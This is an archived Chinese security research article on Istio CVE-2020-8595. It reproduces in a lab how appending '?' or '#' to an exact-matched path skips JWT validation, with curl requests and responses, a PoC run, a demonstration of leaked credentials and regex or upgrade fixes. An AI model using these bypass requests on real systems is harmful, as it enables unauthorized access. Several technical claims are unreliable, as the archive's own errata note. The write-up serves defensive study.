---
source: "gelusus/wxvl 公众号漏洞文库"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "【云原生攻防研究】Istio访问授权再曝高危漏洞"
product: "Istio JWT path triggerRules CVE-2020-8595"
record_type: "analysis"
document_type: "技术文章（细分类待核）"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "实测1.4.2和修复1.4.4/1.3.8清楚，需分支范围不能跨分支简单大于"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/%E3%80%90%E4%BA%91%E5%8E%9F%E7%94%9F%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6%E3%80%91Istio%E8%AE%BF%E9%97%AE%E6%8E%88%E6%9D%83%E5%86%8D%E6%9B%9D%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "missing"
source_note: "原始出处待补；仓库归档不等同原始披露"
id: "vw-04cb711fa184c72d19950325"
entity_id: "ve-04cb711fa184c72d19950325"
schema_version: "1"
---

# 【云原生攻防研究】Istio访问授权再曝高危漏洞

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：Istio JWT path triggerRules CVE-2020-8595
- 文献类型：技术文章（细分类待核）
- 版本、权限及部署边界：实测1.4.2和修复1.4.4/1.3.8清楚，需分支范围不能跨分支简单大于
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 2024转载却去年/今年沿用2020语境，主CVE2020-8595缺元数据，三个2019CVE仅背景
2. 实测1.4.2和修复1.4.4/1.3.8清楚，需分支范围不能跨分支简单大于
3. 根因未剥离query与正文写将query分类处理互相矛盾，应准确说使用含query的请求目标精确比较
4. 普通浏览器/curl URL片段#不会发送到服务器，单加#绕过需原始request-target特殊构造证据
5. /apps策略exact却用/apps/证明401不一致，metadata.name jwt尾空格无效
6. 命令/YAML混入行号、响应多行黏连，无法直接复制
7. JWT签名不是加密，JWT也可采用JWE，CVSS不是机构
8. 同Pod可访问localhost不自动意味着传播或提权
9. 官方公告与研究引用完整，清理广告并保留作者归属

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

 黑伞安全   2024-12-13 14:33  
  
一、概述  
  
  
在过去两年，以Istio为代表的Service Mesh的问世因其出色的架构设计及火热的开源社区在业界迅速聚集了一批拥簇者，BAT等大厂先后也发布了自己的Service Mesh落地方案并在生产环境中部署运行。Service Mesh不仅可以降低应用变更过程中因为耦合产生的冲突（传统单体架构应用程序代码与应用管理代码紧耦合），也使得每个服务都可以有自己的团队从而独立进行运维。在给技术人员带来这些好处的同时，Istio的安全问题也令人堪忧，正如人们所看到的，微服务由于将单体架构拆分为众多的服务，每个服务都需要访问控制和认证授权，这些威胁无疑增加了安全防护的难度。Istio在去年一月份和九月份相继曝出三个未授权访问漏洞（CVE-2019-12243、CVE-2019-12995、CVE-2019-14993）[12]，其中CVE-2019-12995和CVE-2019-14993均与Istio的JWT机制相关，看来攻击者似乎对JWT情有独钟，在今年2月4日，由Aspen Mesh公司的一名员工发现并提出Istio的JWT认证机制再次出现服务间未经授权访问的Bug， 并最终提交了CVE，CVSS机构也将此CVE最终评分为9.0[6]，可见此漏洞之严重性。  
  
本文笔者尝试以JWT作为出发点，首先对其进行介绍，进而延伸到Istio的JWT认证机制及对此次漏洞的剖析，最后通过实验还原CVE-2020-8595漏洞的攻击场景，阅读时长大致10-15分钟，希望能给各位读者带来帮助。  
  
二、背景  
  
  
JSON Web Token（JWT）是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准。JWT也是目前最流行的跨域认证解决方案，对于认证问题，业界一般采用的模式为服务端存储session，客户端通过服务端返回的session_id（即cookie）与服务端进行身份验证从而得知用户身份。这种模式目前存在的问题是扩展性不好，单机没有问题，但在分布式集群环境中是要求session数据共享的。举个例子来说明，A 网站和 B 网站是同一家公司的关联服务，现在要求，用户只要在其中一个网站登录，再访问另一个网站就会自动登录，一种解决办法是采用session将数据持久化，写入数据库，当服务收到请求时都向持久层请求数据，这种方式缺点是工作量大，另外万一数据库挂掉就会存在单点失败问题。另外一种方案是索性将数据保存在客户端，服务端不保存数据了，每次请求都发回服务端，JWT就是这种方案的一个代表。  
  
JWT的原理也较好理解，服务器认证之后会返回一个json对象并发送给客户端，这样每次与服务端通信时都要以此json对象作为凭证去访问，当然考虑到安全问题（用户可能会对json数据进行篡改），服务端生成json对象时会加上签名，故服务端不保存session了，且变为无状态，达到了易于扩展的目的[2]。  
  
Istio架构中的JWT认证主要依赖于JWKS（JSON Web Key Set）， JWKS是一组密钥集合，其中包含用于验证JWT的公钥，在Istio中JWT认证策略通常通过配置一个.yaml文件实现，为了便于理解，以下是一个简单的jwt认证策略配置[3]：  
```
1issuer: https://example.com
2jwksUri: https://example.com/.well-known/jwks.json
3triggerRules:
4- excludedPaths:
5  - exact: /status/version
6  includedPaths:
7  - prefix: /status/

```  
  
其中[4]：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hiayDdhDbxUZ7wKHGkYXhKf66ibQWbFu1D21Ns03W8y4bLwya9T81jv0jkdhmLn7LSncUM0mXibsaloOFaDsTv95A/640?wx_fmt=png "")  
  
issuer：代表发布JWT的发行者；  
  
jwksUri：获取JWKS的地址，用于验证JWT的签名，jwksUri可以为远程服务器地址也可以在本地地址，其内容通常为域名或url， 本地会存在某个服务的某路径下；  
  
triggerRules（重要）：此参数意思为Istio使用JWT验证请求的触发规则列表，如果满足匹配规则就会进行JWT验证，此参数使得服务间认证弹性化，用户可以按需配置下发规则，以上策略triggerRules部分的意思为对于任何带有“/status/”前缀的请求路径，除了/status/version以外， 都需要JWT认证「此次漏洞也是出在这个triggerRules机制上」  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hiayDdhDbxUZ7wKHGkYXhKf66ibQWbFu1DibYpsBq4MfrRALnna5b2zWmn47PjQcEbAgmGckKENGbtZWXnFsGmliaQ/640?wx_fmt=png "")  
  
关于triggerRules配置详细内容可以参考https://istio.io/docs/reference/config/security/istio.authentication.v1alpha1/  
  
三、漏洞说明  
  
  
关于CVE-2020-8595漏洞，Istio的官方声明为[6]:  
  
A bug in Istio’s Authentication Policy exact path matching logic allows unauthorized access to resources without a valid JWT token. This bug affects all versions of Istio that support JWT Authentication Policy with path based triggerRules. The logic for the exact path match in the Istio JWT filter includes query strings or fragments instead of stripping them off before matching. This means attackers can bypass the JWT validation by appending ? or # characters after the protected paths.  
  
我们可以看到问题出现在Istio JWT策略配置中的triggerRules机制，triggerRules包含请求url的字符串匹配机制， 主要有以下四种：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hiayDdhDbxUal4XzpeGtxgGdCb7KQncKdGRwGK2sCSLQrcsUcxQ8mSsH1GW4UHQoGx0dDZKhUBuibarK85vB2ibJA/640?wx_fmt=png "")  
  
图1 triggerRules字符串匹配类型  
  
「exact」是导致这次漏洞的罪魁祸首，它代表完全匹配的字符串才可以满足要求， 而完全匹配原则是需要包含url后面所附带的参数（“?”）以及fragments定位符（"#"），而不是在匹配之前将“?”和“#”隔离的内容进行分离，这里为了便于理解，举一个完整的url例子说明，如下所示：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hiayDdhDbxUZ7wKHGkYXhKf66ibQWbFu1DALaF7oBuA5TZx4onbbx2DjVrF7ppbnuNKUcVtDuTJeLJgZVoYC4Eibw/640?wx_fmt=png "")  
  
图2 完整的url示意图  
  
triggerRules中exact匹配的内容应当“/over/there?name=ferret#nose”，而不是“/over/there”，Istio的JWT认证策略在填写triggerRules时只考虑到了path部分，而省略了query和fragment部分，从而攻击者可以通过在受保护的path后添加“?”或“#”进行绕过从而达到未授权（JWT）访问。以Istio的JWT认证策略举例更容易理解，如下所示：  
  
指定JWT保护路径的原始认证策略如下：  
```
1apiVersion: "authentication.istio.io/v1alpha1"
 2kind: "Policy"
 3metadata:
 4  name: "jwt-example"
 5  namespace: istio-system
 6spec:
 7  targets:
 8  - name: istio-ingressgateway #需要在istio网关入口处部署JWT认证策略
 9  origins:
10  - jwt:
11      issuer: "testing@secure.istio.io" #JWT颁发者
12      jwksUri: "https://raw.githubusercontent.com/istio/istio/release-1.4/security/tools/jwt/samples/jwks.json" #用于验证JWT的JWKS所在URL
13      trigger_rules: #JWT验证请求的触发规则列表
14      - included_paths: #代表只有访问包含以下路径规则才需要JWT认证
15        - exact: /productpage #满足路径与productpage完全匹配后，才可以访问productpage服务（需要JWT认证，没有有效JWT无法访问）

```  
  
问题出在最后一行，如果exact处的url为“/productpage?a=1”或者“/productpage?b=1#go”，那么按照匹配原则，访问路径应该是定位到：https://example.com//productpage?a=1及https://example.com/productpage?b=1#go”  
  
由于这两个url都属于“/productpage”路径下，那么应该当通过JWT身份认证后才可以访问，但因为服务端Istio没有做好防护，将query部分和fragment部分与path进行分类处理了，认为“/productpage?a=1” 不属于“/productpage”这个path， 并且认为其没有添加JWT策略所以不需要进行认证，从而攻击者可以通过在path后添加“#”或“?”轻松绕过JWT认证进行未授权访问。  
  
四．实验验证  
  
##   
  
1**环境**  
  
Istio版本：v1.4.2  
  
Kubernetes版本：v1.16.2  
  
集群主机：node1（Master）/node2 (Slave)   
  
操作系统：Ubuntu 18.04  
  
2**准备工作**  
  
**4.2.1创建foo命名空间**  
```
1kubectl create ns foo

```  
  
**4.2.2创建httpbin服务**  
  
httpbin.yaml 在istio/istio-1.4.2/samples/httpbin路径下[5]  
```
1kubectl apply -f <(istioctl kube-inject -f httpbin.yaml) -n foo

```  
  
**4.2.3创建httpbin gateway**  
```
 1#创建httpbin gateway
 2kubectl apply -f - <<EOF
 3apiVersion: networking.istio.io/v1alpha3
 4kind: Gateway
 5metadata:
 6  name: httpbin-gateway
 7  namespace: foo
 8spec:
 9  selector:
10    istio: ingressgateway # use Istio default gateway implementation
11  servers:
12  - port:
13      number: 80
14      name: http
15      protocol: HTTP
16    hosts:
17    - "*"
18EOF

```  
  
**4.2.4暴露httpbin服务**  
  
通过ingress gateway将httpbin服务暴露在外部可访问  
```
 1kubectl apply -f - <<EOF
 2apiVersion: networking.istio.io/v1alpha3
 3kind: VirtualService
 4metadata:
 5  name: httpbin
 6  namespace: foo
 7spec:
 8  hosts:
 9  - "*"
10  gateways:
11  - httpbin-gateway
12  http:
13  - route:
14    - destination:
15        port:
16          number: 8000
17        host: httpbin.foo.svc.cluster.local
18EOF

```  
  
**4.2.5对httpbin服务部署JWT策略**  
```
 1cat <<EOF | kubectl apply -n foo -f -
 2apiVersion: "authentication.istio.io/v1alpha1"
 3kind: "Policy"
 4metadata:
 5  name: "jwt-example"
 6spec:
 7  targets:
 8  - name: httpbin
 9  origins:
10  - jwt:
11      issuer: "testing@secure.istio.io"
12      jwksUri: "https://raw.githubusercontent.com/istio/istio/release-1.4/security/tools/jwt/samples/jwks.json"
13      trigger_rules:
14      - included_paths:
15        - exact: /ip
16  principalBinding: USE_ORIGIN
17EOF

```  
  
**4.2.6设定环境变量**  
```
1export INGRESS_HOST=http://192.168.19.11:31380
```  
  
  
3**场景复现**  
  
首先我们先访问一个未加JWT认证的url path“/user-agent”  
```
 1root@node2:~# curl -v $INGRESS_HOST/user-agent
 2* Trying 192.168.19.11...
 3* TCP_NODELAY set
 4* Connected to 192.168.19.11 (192.168.19.11) port 31380 (#0)
 5> GET /user-agent HTTP/1.1
 6> Host: 192.168.19.11:31380
 7> User-Agent: curl/7.58.0
 8> Accept: */*
 9>
10< HTTP/1.1 200 OK
11< server: istio-envoy
12< date: Thu， 05 Mar 2020 06:47:22 GMT
13< content-type: application/json
14< content-length: 34
15< access-control-allow-origin: *
16< access-control-allow-credentials: true
17< x-envoy-upstream-service-time: 7
18<
19{
20"user-agent": "curl/7.58.0"
21}

```  
  
可以看到返回200状态码，访问成功！接着再访问加了JWT认证的url path "/ip":  
```
 1Origin authentication failed.root@node2:~# curl -v $INGRESS_HOST/ip
 2* Trying 192.168.19.11...
 3* TCP_NODELAY set
 4* Connected to 192.168.19.11 (192.168.19.11) port 31380 (#0)
 5> GET /ip HTTP/1.1
 6> Host: 192.168.19.11:31380
 7> User-Agent: curl/7.58.0
 8> Accept: */*
 9>10< HTTP/1.1 401 Unauthorized
11< content-length: 2912< content-type: text/plain13< date: Thu， 05 Mar 2020 06:49:37 GMT14< server: istio-envoy15< x-envoy-upstream-service-time: 016

```  
  
可以看到服务端返回401 Unauthorized拒绝访问，原因是需要认证授权，证明策略生效了。我们再访问JWT认证下的path + query(通过添加”?“符号)  
```
1root@node2:~# curl -v $INGRESS_HOST/ip?a=1

```  
```
 1* Trying 192.168.19.11...
 2* TCP_NODELAY set
 3* Connected to 192.168.19.11 (192.168.19.11) port 31380 (#0)
 4> GET /ip?a=1 HTTP/1.1
 5> Host: 192.168.19.11:31380
 6> User-Agent: curl/7.58.0
 7> Accept: */*
 8>
 9< HTTP/1.1 200 OK
10< server: istio-envoy
11< date: Thu， 05 Mar 2020 06:53:00 GMT
12< content-type: application/json
13< content-length: 29
14< access-control-allow-origin: *
15< access-control-allow-credentials: true
16< x-envoy-upstream-service-time: 5
17<
18{
19"origin": "10.244.0.0"
20}
```  
  
可以看到返回为200状态码，说明不需要JWT的认证也可以访问ip这个path下的内容，从而完成绕过。  
  
同理在url后添加“#”符号也完成绕过。  
  
4**验证PoC**  
  
笔者在网上找到一个PoC可以验证此漏洞，此脚本由Google Istio团队Francois Pesce 提供[9]：  
  
https://gist.githubusercontent.com/nrjpoddar/62114128d12478abe8366404bf547b77/raw/1475213902932cc157f49fc0584b8f231e887394/check.sh[11]  
  
实验结果如下：  
```
1root@node2:/home/puming/test# ./test_istio_jwt_cve.sh  istio/proxyv2:1.4.2
2/home/puming/test/cve-2020-8595.VzW0Mi /home/puming/test
3./test_istio_jwt_cve.sh: line 260: warning: here-document at line 148 delimited by end-of-file (wanted `EOF')4Sleeping for 5 seconds so the docker container is up and running5[CVE-2020-8595] Vulnerable63d74c863fdb819f2bcabb8334b1e8f4fdd56c9d0908918ef4f900131fb21c8147/home/puming/test8

```  
  
确实可以证明笔者的Istio环境存在漏洞，感兴趣的读者可以自己尝试。  
  
5**漏洞利用**  
  
未授权的访问漏洞经常会使攻击者有机可乘，通过未授权的资源访问达到一些目的，笔者将通过一个简单实验说明此漏洞的可利用性。在Istio环境中，笔者部署了一个基于django框架的Web应用，此Web应用因为存在某接口（$INGRESS_HOST/apps）的未授权访问漏洞以及逻辑缺陷导致敏感信息泄漏， 通过直接访问  
  
curl -v $INGRESS_HOST/apps?manifest=com.canonical.ubuntu.desktop  
  
curl -v $INGRESS_HOST/apps?manifest=com.mozilla.mozdef 可以将漏洞信息还原，如下所示：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hiayDdhDbxUal4XzpeGtxgGdCb7KQncKd5Juic7Fcxhhzld3SnExWAzf5cwUHEE8KSELHhv2Q2aeCichGpO6GtYFA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hiayDdhDbxUal4XzpeGtxgGdCb7KQncKdZt6icO1Den6wVpG2WtpLnh4WjXdYFl81UVyD1Jz6VocaxZAHV6v8Yjg/640?wx_fmt=png "")  
  
图3 敏感信息泄漏  
  
通过图3的红框部分可以看出，该网站的app详细信息接口由于未授权访问漏洞暴露了app的敏感信息，例如端口号、操作系统版本、用户名密码等。对于网站开发人员来说，可能并不知此漏洞的存在，于是潜在的危险出现了，以下将还原整个过程，首先将此应用部署至Istio，通过下发JWT策略对”/apps”进行身份认证，配置如下：  
```
 1cat <<EOF | kubectl apply -n foo -f -
 2apiVersion: "authentication.istio.io/v1alpha1"
 3kind: "Policy"
 4metadata:
 5  name: "jwt " 
 6spec:
 7  targets:
 8  - name:  web-test
 9  origins:
10  - jwt:
11      issuer: "testing@secure.istio.io"
12      jwksUri: "https://raw.githubusercontent.com/istio/istio/release-1.4/security/tools/jwt/samples/jwks.json"
13      trigger_rules:
14      - included_paths:
15        - exact: /apps
16  principalBinding: USE_ORIGIN
17EOF

```  
  
配置成功后进行访问，可以看到访问失败，证明JWT策略生效了，如下所示：  
```
 1root@node2:~# curl -v $INGRESS_HOST/apps/
 2* Trying 192.168.19.11...
 3* TCP_NODELAY set
 4* Connected to 192.168.19.11 (192.168.19.11) port 31380 (#0)
 5> GET /apps/ HTTP/1.1
 6> Host: 192.168.19.11:31380
 7> User-Agent: curl/7.58.0
 8> Accept: */*
 9>10< HTTP/1.1 401 Unauthorized
11< content-length: 2912< content-type: text/plain13< date: Thu， 07 Mar 2020 04:49:37 GMT14< server: istio-envoy15< x-envoy-upstream-service-time: 016

```  
  
以攻击者视角尝试访问”/apps?”：  
```
 1root@node2:~# curl -v $INGRESS_HOST/apps?
 2* Trying 192.168.19.11...
 3* TCP_NODELAY set
 4* Connected to 192.168.19.11 (192.168.19.11) port 31380 (#0)
 5> GET /apps? HTTP/1.1
 6> Host: 192.168.19.11:31380
 7> User-Agent: curl/7.58.0
 8> Accept: */*
 9>10< HTTP/1.1 200 OK
11< server: istio-envoy12< date: Thu， 07 Mar 2020 04:53:00 GMT13< content-type: application/json14< content-length: 2915< access-control-allow-origin: *16< access-control-allow-credentials: true17< x-envoy-upstream-service-time: 518<19
```  
  
可以成功访问，证明了Istio的未授权访问漏洞确实存在，于是攻击者可以完美绕过JWT认证并且成功利用到程序自身的漏洞，进而访问到每个app的敏感信息，一旦攻击者拥有这些敏感信息例如用户名密码，便可直接对网站上的app进行访问，植入后门，后果不堪设想。  
  
以上只是一个简单的漏洞利用场景，现实攻击中，开发人员还有可能因为疏忽在某访问路径下放置密钥信息，攻击者一旦拿到密钥便可通过ssh登录到其它主机从而展开持续性攻击，所以Istio所爆的漏洞只是为攻击者打开了一扇门，用户自己的应用程序安全性才是最重要的。  
  
五．修复方法  
  
  
- 通过添加正则临时缓解  
  
```
1- jwt:
2    issuer: "testing@secure.istio.io"
3    jwksUri: "https://raw.githubusercontent.com/istio/istio/release-1.4/security/tools/jwt/samples/jwks.json" 
4    trigger_rules:
5    - included_paths:
6      - regex: '/productpage(\?.*)?' #
7      - regex: '/productpage(#.*)?'  #

```  
  
此正则表达式满足 path + query + fragment 完全匹配，我们可以简单实验下可行性：给exact路径添加正则匹配前先将之前的策略删除  
```
 1root@node1:/home/puming/istio/istio-1.4.2/samples/httpbin# kubectl delete policy.authentication.istio.io jwt-example -n foo
 2policy.authentication.istio.io "jwt-example" deleted
 3root@node1:/home/puming/istio/istio-1.4.2/samples/httpbin# cat <<EOF | kubectl apply -n foo -f -
 4> apiVersion: "authentication.istio.io/v1alpha1"
 5> kind: "Policy"
 6> metadata:
 7>   name: "jwt-example"
 8> spec:
 9>   targets:
10>   - name: httpbin
11>   origins:
12>   - jwt:
13>       issuer: "testing@secure.istio.io"
14>       jwksUri: "https://raw.githubusercontent.com/istio/istio/release-1.4/security/tools/jwt/samples/jwks.json"
15>       trigger_rules:
16>       - included_paths:
17>         - regex: '/ip(\?.*)?'
18>         - regex: '/ip(#.*)?'
19>   principalBinding: USE_ORIGIN
20> EOF
21policy.authentication.istio.io/jwt-example created

```  
  
再访问ip的完整URL，如下所示，可以看到服务端返回401 Unauthorized拒绝访问，说明正则匹配生效，'/ip(#.*)?'同理，不作赘述  
```
 1root@node2:~# curl -v $INGRESS_HOST/ip?a=1
 2*   Trying 192.168.19.11...
 3* TCP_NODELAY set
 4* Connected to 192.168.19.11 (192.168.19.11) port 31380 (#0)
 5> GET /ip?a=1 HTTP/1.1
 6> Host: 192.168.19.11:31380
 7> User-Agent: curl/7.58.0
 8> Accept: */*
 9>10< HTTP/1.1 401 Unauthorized
11< content-length: 2912< content-type: text/plain13< date: Thu， 05 Mar 2020 07:02:58 GMT14< server: istio-envoy15< x-envoy-upstream-service-time: 016

```  
  
- 升级Istio至1.4.4和1.3.8以及之后的版本  
  
  
  
六. 漏洞评估  
  
  
CVSS评分为9.0分[6]，级别定位严重，笔者认为未经认证授权访问会带来很多严重性后果，如果是授权页面的话，其它用户可以随意访问，从而会引起重要权限可能被操作、网站目录、数据库等敏感信息泄漏的风险。在Kubernetes环境下，容器为运行Pod的载体，由于Pod内容器之间可以通过Localhost互相访问，所以一旦有一个容器失陷，进而会传播到Pod中的其它容器，如果是特权容器，还有可能风险更为严重，所以此漏洞在微服务环境中风险较大。  
  
七. 总结  
  
  
CVE-2020-8595漏洞让Istio的安全管理机制脆弱性得以暴露，那么JWT自身又存在哪些安全风险呢？笔者通过对JWT的研究了解到JWT本身是不加密的（加密只有JWT的Signature部分）并且是无状态的，所以JWT很容易泄漏并且被利用，虽然Istio的mTLS机制可以解决服务间通讯的流量加密问题，但这样JWT就足够安全了吗？答案是不一定，毕竟谁也不能确保不会把JWT硬编码在源码中，现实攻击手段变幻莫测，唯有知己知彼方可百战百胜，笔者认为需要从自身培养安全意识做起，防护应由内而外，只有这样，我们的系统才够安全。  
# 参考文献:  
  
[1].https://blog.christianposta.com/how-a-service-mesh-can-help-with-microservices-security/  
  
[2].  
http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html  
    
  
[3].  
https://istio.io/docs/reference/config/security/istio.authentication.v1alpha1/#Jwt  
  
[4].  
https://tools.ietf.org/html/rfc7517  
  
[5].  
https://istio.io/docs/tasks/security/authentication/authn-policy/#enable-mutual-tls-per-namespace-or-service  
  
[6].  
https://istio.io/news/security/istio-security-2020-001/  
  
[7].  
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8595  
  
[8].  
https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2020-8595  
  
[9].  
https://aspenmesh.io/aspen-mesh-1-4-4-1-3-8-security-update/  
  
[10].  
https://istio.io/docs/reference/config/security/istio.authentication.v1alpha1/  
  
[11].  
https://gist.githubusercontent.com/nrjpoddar/62114128d12478abe8366404bf547b77/raw/1475213902932cc157f49fc0584b8f231e887394/check.sh  
  
[12].  
https://istio.io/news/security  
  
  
关于星云实验室  
  
星云实验室专注于云计算安全、解决方案研究与虚拟化网络安全问题研究。基于IaaS环境的安全防护，利用SDN/NFV等新技术和新理念，提出了软件定义安全的云安全防护体系。承担并完成多个国家、省、市以及行业重点单位创新研究课题，已成功孵化落地绿盟科技云安全解决方案  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hiayDdhDbxUY2VZS6ctcygfLB3cuGlpfIXcVuDjRVgY2TOOMicMXVGT62dxQducL3l8JsMdeArLuayUdwN9AVsdA/640?wx_fmt=png "")  
  
添加好友，备注“**进群**”，加入容器安全技术交流群，通过后会拉您入群。  
  
内容编辑：星云实验室 浦明  
    
 责任编辑：肖晴  
  
**往****期回顾**  
- [【云原生技术研究】BPF使能软件定义内核](http://mp.weixin.qq.com/s?__biz=MzIyODYzNTU2OA==&mid=2247487440&idx=1&sn=cb6379cfc4a1bba0881363840afc438a&chksm=e84fa90fdf38201990781e3c95d9857e6d4ad083ce40a575e1cbdc12aaabb4f58ba527dc58c1&scene=21#wechat_redirect)  
  
  
- [【云原生攻防研究】容器逃逸技术概览](http://mp.weixin.qq.com/s?__biz=MzIyODYzNTU2OA==&mid=2247487393&idx=1&sn=6cec3da009d25cb1c766bb9dae809a86&chksm=e84fa97edf382068250b4811419aa17811c7f244ab87dcbcbe63be328f98ecaf0ab9feeedf8c&scene=21#wechat_redirect)  
  
  
- [创新沙盒inky的一大关键技术分析：Logo识别技术](http://mp.weixin.qq.com/s?__biz=MzIyODYzNTU2OA==&mid=2247487464&idx=1&sn=f7ec21cc4b61d0d594d2437defab18bd&chksm=e84fa937df382021258a4c16c9cf6fe30e45fc472ffa59e8104c6fa6f818f24b32757c9505a2&scene=21#wechat_redirect)  
  
  
- [【招聘】绿盟科技创新中心实习生招聘公告（长期有效）](http://mp.weixin.qq.com/s?__biz=MzIyODYzNTU2OA==&mid=2247484009&idx=1&sn=9411779e0b73b5007712d0a0f4324d4c&chksm=e84fa4b6df382da069a7092c4aecdc4dabccb13d77fc43c189450a250fc9c7daa85e2ba35276&scene=21#wechat_redirect)  
  
  
本公众号原创文章仅代表作者观点，不代表绿盟科技立场。所有原创内容版权均属绿盟科技研究通讯。未经授权，严禁任何媒体以及微信公众号复制、转载、摘编或以其他方式使用，转载须注明来自绿盟科技研究通讯并附上本文链接。  
  
**关于我们**  
  
  
绿盟科技研究通讯由绿盟科技创新中心负责运营，绿盟科技创新中心是绿盟科技的前沿技术研究部门。包括云安全实验室、安全大数据分析实验室和物联网安全实验室。团队成员由来自清华、北大、哈工大、中科院、北邮等多所重点院校的博士和硕士组成。  
  
绿盟科技创新中心作为“中关村科技园区海淀园博士后工作站分站”的重要培养单位之一，与清华大学进行博士后联合培养，科研成果已涵盖各类国家课题项目、国家专利、国家标准、高水平学术论文、出版专业书籍等。  
  
我们持续探索信息安全领域的前沿学术方向，从实践出发，结合公司资源和先进技术，实现概念级的原型系统，进而交付产品线孵化产品并创造巨大的经济价值。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/hiayDdhDbxUbrbTJxY0Qv9BtgtXZsYVvaVUtlPicCUV6qDBGgZnrxicAMwvibG73JUu0w1UweTicfkuTRIyJyt77C5Q/640.jpeg? "")  
  
**长按上方二维码，即可关注我们**  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原始披露 URL 尚未确认，现有链接按来源追溯区分别标注）
